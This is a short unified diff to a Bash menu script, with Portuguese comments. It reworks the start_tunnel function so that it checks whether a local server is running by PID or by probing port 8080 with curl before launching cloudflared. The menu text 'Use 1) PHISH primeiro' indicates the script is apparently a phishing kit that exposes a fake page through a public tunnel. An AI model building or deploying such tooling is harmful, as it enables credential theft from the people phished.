@@ -707,14 +707,19 @@ start_tunnel() {
     echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
     echo ""
 
-    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
+    # Verificar se o servidor está rodando (PID ou porta)
+    local srv_ok=0
+    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
+        local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
+        kill -0 "$pid" 2>/dev/null && srv_ok=1
+    fi
+    if [ "$srv_ok" = "0" ]; then
+        # Testar se a porta responde
+        curl -s -o /dev/null -w "%{http_code}" http://localhost:8080 2>/dev/null | grep -q "200\|302\|404" && srv_ok=1
+    fi
+    if [ "$srv_ok" = "0" ]; then
         echo -e "${RED}  Servidor OFF! Use 1) PHISH primeiro.${NC}"
         read; return
-    fi
-    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
-    if ! kill -0 "$pid" 2>/dev/null; then
-        echo -e "${RED}  Servidor parou.${NC}"
-        rm -f "$SCRIPT_DIR/.server.pid"; read; return
     fi
 
     if ! command -v cloudflared &>/dev/null; then
